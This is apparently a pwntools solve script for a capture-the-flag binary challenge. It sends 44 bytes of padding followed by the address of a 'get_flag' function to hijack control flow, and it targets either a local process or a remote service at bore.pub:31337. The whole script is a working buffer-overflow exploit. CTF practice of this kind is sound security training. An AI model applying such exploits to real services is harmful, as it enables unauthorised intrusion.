from pwn import *

elf = ELF('./challenge_x86')
context.binary = elf

offset = 44
flag_address = elf.sym['get_flag']  # 0x08049216

payload = b'A' * offset
payload += pack(flag_address)

# Run locally by default, or with `python solve.py REMOTE` for remote bore tunnel
if args.REMOTE:
    p = remote('bore.pub', 31337)
else:
    p = process('./challenge_x86')

# Send 1 after receive '>'
p.sendlineafter(b'>', b'1')

# Send payload after getting 'name?'
p.sendlineafter(b'name? ', payload)

p.interactive()